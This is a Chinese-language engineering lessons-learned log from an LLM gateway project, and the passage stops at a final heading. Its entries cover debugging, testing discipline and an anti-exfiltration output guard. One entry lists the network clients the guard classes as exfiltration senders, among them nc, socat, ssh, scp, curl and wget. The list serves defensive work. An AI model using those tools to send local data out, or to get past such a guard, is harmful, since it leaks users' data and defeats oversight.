- 证据：4 个错误分别由真库门报 `42601` / `22P02` / `cannot scan _text into *string` 抓出；6 道判据的变异 6/6 全红。
- 溯源：同上 §5.6.4。

## 2026-10-20 — 「端点坏」与「端点被取消」必须用两条证据分开（Seen: 1/3）
- 场景：浏览器里 `/request-logs` 恒「共 0 条 / 加载中…」、`/api/admin/turns/sessions` 报 500。一度按「端点有缺陷」查了很久。
- 根因：服务端 `context canceled` ⇒ Go 的 `http.Server` 在**客户端断开**时取消 request ctx。浏览器同源 HTTP/1.1 只有 **6 条**连接且**整个浏览器共享**；内嵌 Browser 每个标签页常驻一条 SSE ⇒ 标签页一多，新请求被**客户端放弃** ⇒ 服务端记 500。真缺陷是**稳定**的，争抢是**时好时坏**的（实测同一端点同标签页 500/200/500）。
- 防复发检查：① 判定「服务端有缺陷」要**两条证据一起看**：「同一请求逐字 curl 重放」⇒ 200 ⇒ 服务端没问题；服务端日志 `context canceled` ⇒ 客户端取消的佐证；② **同端点时好时坏**本身就是争抢的指纹；③ 客户端取消在服务端被记成 `500/server_error`（`middleware/logging_mw.go` 只看状态码）⇒ 监控里「客户端跑了」与「服务端坏了」长得一样（**遗留 L7**）。
- 证据：curl 逐字重放 `GET /api/logs` 恒 200/151–156 条；浏览器 06:26:34 500 / 06:26:36 200 / 06:26:40 500。
- 溯源：同上 §5.5.2。

## 2026-10-20 — 工具的连接池上限会伪造出「数据恒为空」：页面级验收前先问「这个工具每标签页占几条连接」（Seen: 1/3）
- 场景：内嵌 Browser 逐页验收时，页面「完整、无报错、但数据恒空」，一度被当成应用缺陷。
- 根因：内嵌 Browser **每标签页常驻一条 SSE**（`/api/admin/live-stream`），而 Chromium 对同源 HTTP/1.1 只有 **6 条**连接且整个浏览器共享 ⇒ 多标签页时新请求排队/被放弃。这是**工具/环境约束**，不是应用缺陷。
- 防复发检查：① 页面级验收前先问「这个工具每标签页占几条连接」；不满足时改用**单页顺序访问**的无头脚本（本轮：playwright-core + 本机缓存的 Chrome for Testing 1223，104 页顺序扫，全程最多 1 条 SSE）；② 无头脚本顺带给出**每 API 的状态与耗时**，比 DOM 断言更适合做「>2s 定位」；③ 判据材料留档：`/tmp/llmgw-retire-20261020/pw/sweep.mjs` + `sweep.tsv`（104 行，逐页一行）。
- 证据：104 页扫描结果：文档级 103/104 可达（唯一例外 `/maintain` 503 = 本机未部署该服务）、**0 个 API ≥2000ms**、**0 个 JS 运行时异常**、5xx API 9 处（全部 curl 可复现）。
- 溯源：同上 §5.5。

## 2026-10-20 — 判据与被测对象读**同一个函数**时，跨两次读做精确相等 = 竞态（Seen: 1/3）
- 场景：`go test ./admin/` 偶发红 `TestDataLifecycleTableSizesFieldsAreComplete`（「首行 TotalBytes 与 PG 实时值不一致」）。同提交**再跑就绿**，pristine worktree 也绿 ⇒ 一度怀疑是本轮引入的产品缺陷。
- 真因：端点 `tableSizesSQL` 的 `TotalBytes` 取 `pg_total_relation_size(c.oid)`，判据的 live 查询用的**也是** `pg_total_relation_size` ⇒ 两者相等的前提是「两次读之间那张表没变」。而首行是**全库最大的表**（本机实测 `public.ursm_node_snapshot_min` 231MB），**网关的后台 worker 正在批量写它**（`n_tup_ins=49283`，实测 5 秒涨 64KB）⇒ 快照采集与 live 查询之间落进一次写入就不相等。第二层：端点的 `WHERE` 不排除非 public schema，首行可能是**用例自己建的临时 schema 里的表**，用例一结束就 `DROP CASCADE` ⇒ live 查询直接 42P01。**端点是对的，变的是判据的前提。**
- 防复发检查：① 判据要读「活数据」时，**先问两次读之间它会不会变**——会变就不能做精确相等，要按**它自己声明的容差**（本例注释早就写的是「±1%」，实现却写成了精确相等 ⇒ **判据没做到它自己声明的事**）；② 容差要留**页级下限**（小表上 1% 可能小于一个 8KB 页）；③ 关系可能已被删时**改判下一行**，但必须保留「**至少有一行成功对账**」的前提断言，否则会退化成「压根没对账」的假绿；④ 判据的注释不是证据，**断言才是**——注释写 ±1% 而代码写 `!=`，以代码为准去质疑注释与现实。
- 证据：同提交两次全量跑（先 FAIL 后 PASS）；pristine worktree `8cec460b3` 全量跑 PASS；端点与判据同用 `pg_total_relation_size`（`admin/data_lifecycle_storage.go` 的 `tableSizesSQL`）；`pg_stat_user_tables` 读数 `n_tup_ins=49283, n_tup_del=0`；修后变异（`t.TotalBytes *= 2`）如期转红并点名偏差 231268352 > 容差 2312683。
- 溯源：[复核轮](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.7。

## 2026-10-20 — 数组字段的 JSON 空值形态：Go nil slice 序列化成 `null`，而 TS 类型往往声明成**非空数组**（Seen: 1/3）
- 场景：104 页逐页扫描在 `/quality-correlations` 上抓到本轮**唯一一条** JS 运行时异常：`TypeError: Cannot read properties of null (reading 'reduce')`。页面文档级 200、其它 API 全绿，只有这一格算不出来。
- 真因：契约两端不一致。**后端** `var breakdown []QualityCorrelationRow` 是 Go 的 **nil slice** ⇒ JSON 序列化成 **`null`** 而不是 `[]`；而同一个 handler 里下方的 `insights := []QualityCorrelationInsight{}` 被**显式**初始化了 ⇒ 同一响应里两个数组字段的空值形态不一致，是疏漏。**前端** `QualityCorrelationResponse.breakdown` 却声明成 `QualityCorrelationRow[]`（非空）⇒ **类型成了假的安全网**，页面于是直接 `resp.breakdown.reduce(...)` ⇒ null 时当场抛异常。触发条件是**合法业务状态**（本地库 `session_turns` 里 `is_auto_request IS TRUE` 命中 0 行 ⇒ 聚合 0 行）。
- 防复发检查：① 后端**任何**要返回的数组字段，出声明处就用 `[]T{}` 初始化，不要留 nil slice；同一响应里若有多个数组字段，**形态必须一致**（一个 `[]` 一个 `null` 就是 bug）；② 前端的 TS 类型若由**后端契约**推导，就得承认 wire 上可能是 `null`（单独一个 `Wire` 类型），否则类型会骗人；③ 归一化放在**边界**（写进响应式状态之前）而不是模板里 —— 防御散落在 4 个模板表达式里**就会漏掉第 5 个**，且会改掉既有跨层契约门禁钉的模板形态；④ 前端**不能依赖后端**：后端修好后前端那道门仍要有效 ⇒ 门要断言「**页面的承受力**」，不要断言「后端返 null」这个具体形态，否则后端修好门就变废门。
- 证据：端点实返 `{"breakdown":null,"insights":[]}`（同一响应里形态不一致的直接证据）；`pg_stat_user_tables`/session_turns 读数 `is_auto_request IS TRUE` = 0 行；3 道新判据（真库+真 handler+解进 map 才看得见 `null` 与 `[]` 的区别 / 静态门钉写法 / 前端门钉承受力）全部做过变异验证，去掉归一化时前端门报的正是生产同款 `TypeError`。
- 溯源：[复核轮](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.8。

## 2026-10-20 — 复核自己上一轮写下的结论：「现象看着像缺陷」≠「迁移没做到」（Seen: 1/3）
- 场景：上一轮在遗留表里记了 L1：「7 张 v1 分区表未带 `_` 待删标志（`pg_inherits` 显示父表是 `_request_logs`）⇒ **新装与存量环境形状分叉**」，并建议「出一条迁移把存量分区改名」。本轮复核时按这个建议准备动 DDL。
- 真因：**三条决定性证据**把前提推翻了：① 迁移 860 的头部注释**明写**「monthly partitions and archive children … they **inherit the marker through their renamed parents** and are dropped together with them; their index names likewise stay」⇒ 不带前缀是**设计**，不是漏；② 正典基线 schema 造出来的分区就叫 `request_logs_2026_07/08`（`ALTER TABLE ONLY public.request_logs ATTACH PARTITION …`），860 随后**只改父表** ⇒ **新装与存量形状完全相同**，「分叉」不成立；③ 全仓 grep 无任何**生产 DDL** 造 `_request_logs_YYYY_MM` —— 那个名字只出现在 `migration_862_integration_test.go:54` 的**合成夹具**里，而 862 的**生产 SQL 本身是父表派生**的。
- 关键推论：**改名不仅不是正确修法，还会把分叉做活** —— 860 的函数体改写**刻意跳过**了动态前缀 `'request_logs_' || to_char(...)`（边界守卫注释写明「dynamic prefixes … must not be touched」），只改存量分区名而不改函数体，重新开写路径时函数又会造出**无前缀**分区 ⇒ 分叉原地复活。**真正该修的是「按名字枚举」这个口径**（改成按 `pg_inherits` 走父表），而不是改名字。
- 防复发检查：① 判「某个形状是不是缺陷」时，先去读**做这件事的那条迁移的头部注释**与**正典基线 schema**（它们是书面证据），而不是从「现象」反推意图；② 看到「新装与存量分叉」这类断言，先验证**新装环境到底产出什么**（基线 schema + 迁移顺序），别拿一个**测试夹具**里的名字当契约；③ 判据/文档里引用了某个对象名时，先确认它是**生产 DDL** 产出的还是**夹具**里合成的；④ 真要改「待删标志」的物理形态，必须同时改**产生它的那段代码**（函数体的动态命名），否则分叉会复活。
- 证据：`860_rename_request_logs_family_pending_delete.sql:18-21`；`deploy/sql/schemas/baseline/01-schema.sql:13002/13150/19569`；`862_partition_family_leading_ts_idx.sql:60`（`ON public._request_logs (ts)`，无硬编码子分区名）；`migration_862_integration_test.go:54`（夹具）；真库 `pg_inherits` 读数（7 张分区的父表是 `_request_logs` / `_request_logs_bodies`）；修后两处脚本的**旧口径 vs 新口径差集**：analyze 补 5 张 / rotate 补 4 张，**回退 0 张**。
- 溯源：[复核轮](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.9。

## 2026-10-20 — 判「上游/环境坏了」还是「产品坏了」：找**独立于症状**的第二条证据（Seen: 1/3）
- 场景：模型请求在 08:00 连续 5 次 200、08:02 起全部 503（`no_candidate` / `upstream_down`）。直觉是「刚部署完把网关弄坏了」。
- 真因：三个**互相独立**的环境原因叠加：① 凭据 1 `availability_state='auth_failed'` ⇒ 被 `autoroute/index.go` 的 `refreshIndexSQL` 里 `COALESCE(cr.availability_state,'ready')='ready'` 滤掉 ⇒ `candidates_count:0`；② `proxy_nodes` 与 `proxy_subscriptions` **都是 0 行** ⇒ 需出网代理的 provider 必然 `upstream_down: no available active nodes`；③ 凭据 3 上游 429 `budget_exceeded`（Organization balance insufficient）⇒ `quota_state='permanently_exhausted'`。网关的行为是**正确**的（摘除失败候选并给出明确原因，而不是路由到已知坏的凭据）。
- 防复发检查：① 判「是不是我弄坏的」要拿**独立于症状**的第二条证据：这里用的是「同一份二进制在 08:00:15–08:01:15 连续 5 次 200 且完整落库」+「刷新作业健康（每 5 分钟一次、最新桶有数据、`credential_model_index_hot` 里目标模型在位）」⇒ **数据在库里，缺的是凭据与代理节点**；② 顺着错误文案往下钻到**判定那一层**（`no_candidate` ⇒ 查 `refreshIndexSQL` 的 WHERE 谓词；`upstream_down` ⇒ 查 `proxy_nodes`），别停在错误码上；③ 「是不是我改坏的」的第一反应应当是查**上游/环境状态**（凭据可用性、代理节点库、上游余额），因为这三样每天都在变。
- 证据：`credentials` 三行读数（`auth_failed` / `ready` / `suspended+permanently_exhausted`）；`proxy_nodes`=0、`proxy_subscriptions`=0；`node_probe_state` 退避中的 9 行；`auto index refreshed` 每 5 分钟且 `credential_rows=7`；成功批次的 5 行读回（`turn_no` 1..5、success=t、正文三列 `jsonb_typeof='array'`）。
- 溯源：[复核轮](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.10。

## 2026-10-20 — 落库点不等于查询点：写侧落在 hot 表时，用父表查「刚发的请求」必然查不到（Seen: 1/3）
- 场景：模型请求 5 次 200 之后，`SELECT … FROM session_turns WHERE session_id='<gw_…>'` **返回 0 行**，一度以为「又没落库」。
- 真因：写侧落在 **`session_turns_hot`**（本轮 15 次请求的新数据全在 hot 表），晋级到 `session_turns` 有延迟；正文同理在 `session_bodies_hot`（独立表，**父表 `count(*)` 不含它**）。⇒ 「查父表查不到」不等于「没写」。
- 防复发检查：① 判「数据落库了吗」要按**写侧的真实落点**查（hot 表 / 按时间窗查父表），别默认父表；② 落库验证的口径固定为 `jsonb_typeof(col)='array'`（**不用** `IS NOT NULL` —— JSON `null` 也满足 `IS NOT NULL`）；③ 读数前先记**请求前基线**（本轮：`session_turns=876` / `session_turns_hot=174` / `session_bodies_hot=174`），用**增量**说话。
- 证据：请求后 `session_turns_hot` 新增 15 行（3 会话 × 5 轮，`turn_no` 1..5）；`session_bodies_hot` 同会话 5 行的 `outbound_body`/`response_delta`/`request_delta` 的 `jsonb_typeof` 全为 `array`。
- 溯源：[复核轮](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.10.5。

## 2026-10-20 — 门禁钉在哪个相位，决定它能不能失败（Seen: 1/3）
- 场景：修「已发布规则里的地址族规则在输出面遮蔽 IP」（用户报告
  `export https_proxy=http://[REDACTED]:7890`）。第一版门禁写在**输入面**
  （`SanitizeInput`），自认为覆盖了缺陷。
- 真因：`DetectScope` 的作用域是**相位**级的，而输入与输出走**不同相位**：
  输入侧 `SanitizeInput` → `ScopeInputDeclarations` ⇒ 相位 `"input"`；
  输出侧 `outputSensitiveChecker.Check` → `detector.Detect`（= `ScopeRedact`）
  ⇒ 相位 `"output"`。legacy 地址规则挂的是 `scopes=[output]` ⇒ 它在**输入面
  压根不适用** ⇒ 门禁**恒绿**（假绿）：修复前修复后都绿，钉不住任何东西。
  靠**变异验证**才发现（改坏实现后主门禁纹丝不动，只有边界那条转红）。
- 防复发检查：① 写门禁前先确认「被测代码走哪个相位」，用**同一个相位**驱动它
  （本轮为此把输出侧单独设门，并把输入面的门改用**同时挂 input 相位**的规则形态）；
  ② 「没被遮蔽」类断言的前提要用**结构性**断言（规则在快照里 / 作用域含该相位 /
  enabled / 正则确实匹配这段文本），**不要**用「另一个面看得见」——相位不同，
  另一个面看不见是**规则形状**决定的，不是检测器坏了；
  ③ 门禁写完**必须**做变异验证，且以「**主门禁**转红」为通过标准，边界门转红不算。
- 证据：`security/sanitize/r1038_redaction_scope_marker_test.go`（13 条），
  变异「地址族排除失效」→ 6 条转红；第一版（只测输入面）变异下 0 条转红。
- 溯源：本轮 r1038；[复盘](docs/audit/2026-10-20-r1038-脱敏范围与遮蔽标记.md)。

## 2026-10-20 — 数据修复不是代码保证：停用 DB 行 ≠ 行为消失（Seen: 1/3）
- 场景：851 迁移把 `pii_patterns.ip_address` 那行 `enabled=false`，用户以为
  「IP 不会被遮了」就完事了。但 legacy 导入把**同一行**造成
  `type=server_ip / scopes=[output] / action=mask` 的**托管规则**，
  而**基线快照不可变** ⇒ 851 之前发布过基线的部署拿到的快照里那行仍然是 enabled
  ⇒ 遮蔽会一直存在，直到有人手工重发一版规则。
- 真因：停用 DB 行只影响**下一次**基线发布；已发布快照是**历史**。
  而「这条规则被启用时会发生什么」是**代码**的问题，不该由数据承担。
- 防复发检查：① 凡是「某类数据被停用/收紧」当作安全修复的，必须同时有**代码级
  兜底**（本轮：`DetectScope` 的地址族排除改为**全路径**生效，fallback 与托管规则
  同口径）；② 基线/快照的**形状**要有门禁钉住（本轮抽出 `legacyPIIRule` 并加
  `TestR1038LegacyPIIRuleMarksAddressFamilyAsLog`：地址族行的 action 必须是 `log`），
  否则形状被改回 mask 时没有任何判据会报警（已发布快照是运行期数据，测试看不见）；
  ③ 「只撤遮蔽、不撤检出」要成组实现：地址族在脱敏面放行，但命中**照记**进台账。
- 证据：`cmd/gateway/r1038_legacy_pii_shape_test.go`、
  `security/sanitize/r1038_redaction_scope_marker_test.go`；245 上已发布快照
  v13（2026-10-19）实测 `compliance.pii.11 enabled=false`，本机基线 v1
  （2026-10-16）实测无 `compliance.pii.*`。
- 溯源：本轮 r1038。

## 2026-10-20 — 别把输出字段当输入用：那是契约变更（Seen: 1/3）
- 场景：要让「地址族 PII 命中只检出、不遮蔽」，第一版把 `ComplianceIssue.Redacted`
  当成 `redactOutput` 的**输入**（`policy.AutoRedact && issue.Redacted`）。
- 真因：`Redacted` 是**输出**（这条命中有没有被遮蔽），给管理台看的。拿它当输入
  ⇒ 任何**手工构造 issue** 的调用方（不填这个字段）会突然失去遮蔽能力 ——
  `domains/outputcompliance/owner_test.go` 的 `TestRedactOutput_MultipleIssuesDescendingOrder`
  立刻变红（它构造的 issue 不带 `Redacted`）。
- 防复发检查：① 要给某类 issue 加「不改写正文」的语义，用**独立字段**
  （本轮新增 `DetectOnly`），不要复用已有字段——已有字段的语义属于它的读者；
  ② 改 `redactOutput` 的判定条件前，先问「这个字段的**既有读者**是谁」：
  结构体上的布尔字段通常同时被 UI / 存储 / 测试读；③ 契约测试变红时先分
  「判据过时」与「真缺陷」：本轮那条红是**真缺陷**（契约被我改了），
  改法是加字段而不是改判据。
- 证据：`domains/outputcompliance/checker.go`（新增 `DetectOnly`）、
  `domains/outputcompliance/owner_test.go:138`（未改判据即绿）。
- 溯源：本轮 r1038。

## 2026-10-20 — 改「默认值」会让既有判据**同时从两端假绿**：闸门判据要落在默认不放开的那一档（Seen: 1/3）
- 场景：给防外传守卫引入「硬阻断清单」，出厂默认只保留请求侧（input）允许硬阻断，egress/output 一律不终止回合。
- 根因：既有判据写的是「**这条守卫开着的时候**它拦得住 X」。默认值一改，它们从「测拦截能力」退化成「测默认不拦」——**阻断侧与允许侧都会假绿**（判据纪律第 3 条：放行有两种成因，(b) 压根没触发也是放行）。本轮 28 条既有判据差点集体失去意义。
- 防复发检查：① 引入「默认行为可配」的机制时，给受影响的包各加一个 `TestMain`，把开关打开成「引入前的行为」固定住，既有判据继续测原语义；**默认行为另起一组判据**并显式设置默认值，不要依赖隐式前提；② ★ **闸门本身的判据必须落在「默认不放开」的那一档**——本轮先只写了「input 仍 fail-closed」，而 input 默认就在清单里 ⇒ 「闸门在」与「闸门被摘」两种情况**都拦** ⇒ 变异验证摘掉闸门后**全绿**；补了 output scope（默认不在清单）的正负对照才抓住；③ 闸门判据要成对写：「默认不终止」+「清单开启则终止」+「清单清空则连 input 也降级」。
- 证据：`security/sanitize/hardblock_testmain_test.go`、`domains/outputcompliance/hardblock_testmain_test.go`、`domains/streaming/hardblock_testmain_test.go` 三个 TestMain；变异 M3（摘掉 detector 的清单闸）第一次**全绿**，补判据后转红。
- 溯源：211 空响应事故 r1037；[复盘](docs/audit/2026-10-20-r1037-211-空响应与硬阻断清单.md)。

## 2026-10-20 — 「改写既有判据」是实现缺陷的信号：把「默认动作」降级成「可开关的一档」，既有契约一条都不用改（Seen: 1/3）
- 场景：211 上 zcode 用 minimax-m3 干活，模型要 curl 下载 Android SDK 镜像，整条工具调用被 `builtin.network_destination` 掐掉 → 客户端 `reason=empty_model_response`。
- 根因：那条规则的 pattern 是**通配** `(?s).+`，命中与否全看「文本里有没有公网主机」——「**提到**公网主机」≠「**把数据送到**公网主机」。这是本守卫第三次因同一种形态误伤收窄（r1033 版本四元组 / r1035 中文地址 / r1037 下载 URL）。
- 教训（本轮最贵的一条）：第一版实现方向是「用方向判定**替换**形状判定」，代价是必须改写 `r1016`（3 条 must-block 换成外送形态）、`r1035`（触发物换掉）——**改写既有判据是实现缺陷的信号，不是实现方案的代价**。改成「形状规则保留原语义、但降级为清单里可开关的一档」+「新增一条方向规则作为精确档」后，`r1013`/`r1016`/`r1020`/`r1028`/`r1035` **一行未改、全部原样绿**。
- 防复发检查：① 收紧/放宽一类守卫时，先问「**旧契约想守的那条底线**是否仍然成立」——成立就把「默认动作」降级成「可配置的一档」，不要动判定语义；② 要动判定语义时，先在审计文档里写清「旧契约的哪一条不再成立、为什么」，再改判据；③ 同一族误伤跨三个工作日复现（r1033/r1035/r1037）⇒ 守卫的**判据形态**本身要复审，不是逐条加豁免。
- 证据：`git diff` 显示 `security/sanitize/r1016_*` 与 `r1035_*` 最终**零改动**；既有契约全绿；新判据 `TestR1037SinkRuleBlocksOnlyRealExfiltration`（方向档只拦真外传）与 `TestR1037ShapeRuleAllowlistRestoresOldBehaviour`（形状档恢复旧行为）正负对照。
- 溯源：211 空响应事故 r1037；[复盘](docs/audit/2026-10-20-r1037-211-空响应与硬阻断清单.md)。

## 2026-10-20 — 精确档的 fail-closed 默认会把 `echo "https://…"` 也拦掉：覆盖面交给另一档（Seen: 1/3）
- 场景：给防外传守卫做「方向档」（只拦把本地数据送往公网的命令），第一版沿用 r1019 的口径「认不出来的命令按发送处理（fail-closed）」。
- 根因：fail-closed 默认在方向档里**过宽**——`echo "https://example.com"`、`cat notes.md`（正文含 URL）、以及**惰性内容工具**（Write 写进文档的命令示例）都被判成外传。这正是 r1033/r1035/r1037 三次形态误伤的共同成因：把「认不出来」当成「有罪」。
- 防复发检查：① 精确档只认**已声明的网络客户端**（读取型：curl/wget/http/aria2c + git 只读子命令；发送型：nc/socat/ssh/scp/mail/上传类），未声明 ⇒ 不是外传；② **覆盖面由另一档兜底**（形状规则认「提到了公网主机」，管住没列进集合的客户端）——两档分工明确，运维按需要选；③ 精确档只对**本地执行类工具**生效（Bash/shell/exec…），惰性内容工具的参数是「被写下的数据」不是「会被执行的命令」；④ 判定按 token 认客户端 ⇒ 写判据时注意 token 粒度（`示例：curl` 是一个 token，认不出是 curl）。
- 证据：变异 M8（把 fail-closed 默认改回来）与 M9（摘掉「只对本地执行工具生效」）最初**全绿**——前者是因为用例全是已声明客户端、那条分支走不到；后者是因为非托管路径在惰性工具处提前短路、缺口只在托管路径。补了 `echo https://example.com` 用例与托管路径的 Write 用例才分别抓住。
- 溯源：211 空响应事故 r1037；[复盘](docs/audit/2026-10-20-r1037-211-空响应与硬阻断清单.md)。

## 2026-10-20 — 同一族守卫的两条分支，一条带原因一条不带 ⇒ 现场查不出是哪条规则（Seen: 1/3）
- 场景：211 现场日志只有 `output_compliance: blocked stream event label=__tool_json@Bash field_bytes=352`，既没有 reason_codes 也没有 rule_id，运维无法据此判断「该不该把这条规则加进清单」。
- 根因：同一族守卫有**两条**拦截分支——`lane` 那条带 `reason_codes`，`event` 那条**不带**任何原因。拦截错误在流式拦截器里被降级成 `errors.New("output policy blocked stream event")`，规则名在半路丢了。
- 防复发检查：① 拦截路径上**规则名必须一路透传到客户端**：检查器产出 `ComplianceIssue.RuleID` → 错误类型带 `RuleID` → 拦截结果带 `Metadata` → 写者渲染终帧时带 `"rule"` 字段；② 同族分支的日志字段要**逐条对齐**（一条有 reason_codes，另一条也必须有）——加字段时按「分支」而不是按「函数」盘点；③ 协议终帧要**能被客户端解析器吃下**：openai-responses 形状的 `response` 对象缺 `id`/`object`/`status` 时整帧会被丢掉，表现与「空响应」一模一样。
- 证据：`errorsx/policy_block.go`、`ComplianceIssue.RuleID`、`ChunkResult.Metadata`、三种协议形状的终帧都带 `"rule"`；判据 `TestR1037PolicyFailureFrameCarriesRule` / `TestR1037ResponsesFailureFrameCarriesResponseIdentity` / `TestR1037BlockedTerminalCarriesRuleName`（端到端跑生产链，断言终帧含规则名）；变异 M4/M5 转红。
- 溯源：211 空响应事故 r1037；[复盘](docs/audit/2026-10-20-r1037-211-空响应与硬阻断清单.md)。

## 2026-10-20 — 「配置项替换默认值」会静默关掉已有的收紧；配置类开关应当**累加**（Seen: 1/3）
- 场景：给防外传守卫加硬阻断清单（出厂默认 = 只有 input 允许硬阻断），运维用环境变量配一条 egress 规则。
- 真因（**生产部署实测才发现**）：首版语义是「环境变量有值 ⇒ **替换**出厂默认」。211 实测设 `egress:builtin.egress_sink` 后，启动日志 `allows=[egress:builtin.egress_sink]` —— **input 没了** ⇒ 只想定一条 egress 规则的运维，顺手把请求侧的明文凭据 fail-closed 也关了。失败形态是**静默放宽已有收紧**，日志里还看不出异常（它照常打印了一行 loaded）。
- 防复发检查：① 任何「默认值 + 配置项」型开关，**默认项必须是不可被配置项顶掉的那一层**——配置项只能**加**规则；要关默认项必须另给一个**显式**写法（本轮用 `-`）；② 启动日志要把**合并后的完整清单**打出来（不是只打配置项），并在判据里钉住「配置 egress 规则后 input 仍然在」；③ 单测要覆盖「默认值 + 配置项」的**合并结果**，不是只覆盖「配置项生效」。
- 证据：`domains/sanitizerules/hardblock.go`（`LoadHardBlockAllowsFromEnv` 累加 + 去重）、判据 `TestR1037LoadFromEnvIsAdditive`；211 五轮部署的启动日志读数。
- 溯源：211 空响应事故 r1037 的部署验证段；[复盘](docs/audit/2026-10-20-r1037-211-空响应与硬阻断清单.md) §7.3。

## 2026-10-20 — 部署机的环境变量到不了远端执行的引擎：「export 了再部署」可能是空操作（Seen: 1/3）
- 场景：给容器注入一个运维可配的环境变量（`LLM_GATEWAY_HARD_BLOCK_RULES`）。部署机 `export` 后跑部署脚本，**容器里压根没有这个变量**，行为仍是默认值。
- 真因：`--via` 形态的部署引擎是在**目标机**上执行的（`ssh "$VIA" "cd … && bash scripts/deploy-seamless-docker.sh …"`）。部署机的环境变量只活在本机进程，**不会**跟着 ssh 命令走——除非显式转发。引擎里已有的转发清单（`_dd_fwd`）没列这个变量。
- 防复发检查：① 凡是「部署机可配 ⇒ 要进容器」的变量，都必须进引擎的**远端转发清单**，并加一条**契约门**断言「该变量出现在转发清单里」（只看引擎读没读它不够）；② 文档里给出的运维路径要与实际一致：**改远端 env 文件**（引擎跨部署保留）与**部署机 export**（需转发）要分别写清哪条生效；③ 部署后**核验容器里那个变量本身**（`docker exec … printenv`），别只看启动日志。
- 证据：`scripts/deploy-seamless-docker.sh` 的 `_dd_fwd` 清单 + `tests/deploy_211_contract_test.sh` 新增断言（124 通过 0 失败）；211 实测「export 后容器 env 仍无该变量」⇒ 补转发 ⇒ 实测容器 env 出现该值。
- 溯源：211 空响应事故 r1037 的部署验证段；[复盘](docs/audit/2026-10-20-r1037-211-空响应与硬阻断清单.md) §7.3。

## 2026-10-20 — 代码级判定（不在规则快照里）的命中，台账是空的：承诺与实现要对齐（Seen: 1/3）
- 场景：给防外传守卫加的**方向档**（`builtin.egress_sink`）是代码级判定——它不在规则快照里，因此没有「片段」可 observe ⇒ 命中只落在容器日志（`rule_id=builtin.egress_sink`），`sanitize_rule_events` 台账里一条都没有。
- 真因：台账写入走的是「片段 observe」这条路；代码级判定没有片段 ⇒ 走不进台账。而运维文档承诺的是「命中只记台账」——**承诺与实现不符**，且这一档恰恰是本轮新增的**推荐加固档**，运维最需要用它判断「该不该继续开着」。
- 防复发检查：① 任何**新增的判定路径**都要问「它命中了进不进台账」——不在规则快照里的判定要**自己合成片段**再 observe（只带 RuleID/Type/Kind，**不带值**：observe 路径不读 Value，无泄漏面）；② 文档里写「命中记台账」这类承诺时，逐条对到**每条**判定路径，而不是对到「有快照规则的那些」；③ 判据要覆盖**两种动作**（清单外记 log / 清单内记 block），只测一种会漏掉「该记的时候没记」。
- 证据：`security/sanitize/output_sensitive.go`（方向判定命中一律 observe）；判据 `TestR1037SinkRuleHitIsRecordedInLedger`（两个子用例），变异 M11（摘掉 observe）两个子用例都转红；211 生产台账读数：默认档 `builtin.egress_sink|egress|log`、方向档 `builtin.egress_sink|egress|block`。
- 溯源：r1037 在 211 补到含 r1038 的 main 后的生产复验；[复盘](docs/audit/2026-10-20-r1037-211-空响应与硬阻断清单.md) §7.6。

## 2026-10-20 — 「请求里有这条命令」≠「模型发出了这条命令」：验收要读**实际产出的**内容（Seen: 1/3）
- 场景：生产复验「某个 Bash 命令在方向档下是否被拦」。初版脚本用「响应里有没有 `function_call`」判断模型是否发出了工具调用，一轮读到「未被拦」，差点当成「方向档漏拦」。
- 真因：那一轮模型**没照发那条命令**（minimax-m3 对某些命令会自己改写或拒答）⇒ 「有 function_call」是假阳性；而「被拦」的表现恰恰是**工具调用参数不上线**，两个信号混在一起 ⇒ 读数互相污染。
- 防复发检查：① 判「模型是否发出了 X」要读**实际产出的字段**（Responses 协议读 `response.function_call_arguments.delta` 的内容；Chat 协议读 `delta.tool_calls[].function.arguments`），不要用「有没有某个事件类型」代替——事件类型只说明「有工具调用」，不说明「调用的是哪条命令」；② 「被拦」的表现与「模型没发」在客户端侧**长得一样**（都没有工具调用参数）⇒ 判定必须把两者分开：读实际内容 + 看网关侧日志的 `rule_id`；③ 一次读数异常先怀疑**夹具/读法**，别急着改被测行为（本轮重跑同一命令即被拦，读法是错的）。
- 证据：复验脚本从「找 `function_call` 字符串」改成「拼 `response.function_call_arguments.delta`」后读数稳定；网关侧日志 `output_compliance: blocked stream event ... reason_codes=[egress_destination] rule_id=builtin.egress_sink` 作权威旁证。
- 溯源：r1037 补到含 r1038 的 main 后的生产复验；[复盘](docs/audit/2026-10-20-r1037-211-空响应与硬阻断清单.md) §7.6。

## 2026-10-20 — 量具坏掉的现象与服务端坏掉**同形**：先验量具的产出，再看服务端的报错（Seen: 1/3）
- 场景：补做「累积式多轮」测试，第 1 轮 200，第 2 轮起全部 `400 sanitization_failed: Invalid request body`；服务端日志写的是 `sanitize_middleware: sanitize failed / invalid sanitizable request: JSON object required: unexpected end of JSON input` ⇒ 看起来 100% 像服务端 bug。
- 根因：量具用 `sed 's/\n__HTTP__[0-9]*__T[0-9.]*$//'` 剥 `curl -w` 追加的标记，**macOS 默认的 BSD sed 不把 LHS 的 `\n` 当换行**（只有 GNU sed 才当）⇒ 标记留在 payload 里 ⇒ `json.loads` 抛 `Extra data` ⇒ **history 被悄悄置空**（`history=$(python3 …)` 失败时命令替换得到空串，脚本继续跑）⇒ 下一轮请求体变成空串 ⇒ 服务端如实地说「请求体非法」。
- 防复发检查：① 凡是「服务端说我的请求体非法」，**先看落盘的请求/响应原件**——本例落盘文件里还带着 `__HTTP__200__T1.5` 标记，一眼可辨；② 量具里凡是「用子进程产出下一个中间变量」的地方，**失败必须显式中止**，不能让失败值（空串）流进下一轮——「静默清空」比「直接报错」贵得多；③ 跨平台脚本不要依赖 `sed` 的 GNU 扩展（`\n`/`\r` 等），剥标记改用 `python3` 按 `rfind("\n__HTTP__")` 切。
- 证据：本地对照（同一输入）`old=[{"a":1}\n__HTTP__200__T1.5]` vs `new=[{"a":1}]`；服务端日志 `sanitize_middleware: sanitize failed`；修法见 `/tmp/llmgw-retire-20261020/real-model-multiround-accum.sh`（剥标记 + history 失败即中止）。
- 溯源：request_logs→session_turns 复核轮 §5.11.2；[复盘](docs/audit/2026-10-20-request-logs-session-turns-复核轮.md) §5.11.2 / §9.1。

## 2026-10-20 — 探活一次只碰**一个**模型：一个模型的 429 会把整个凭据冷却（Seen: 1/3）
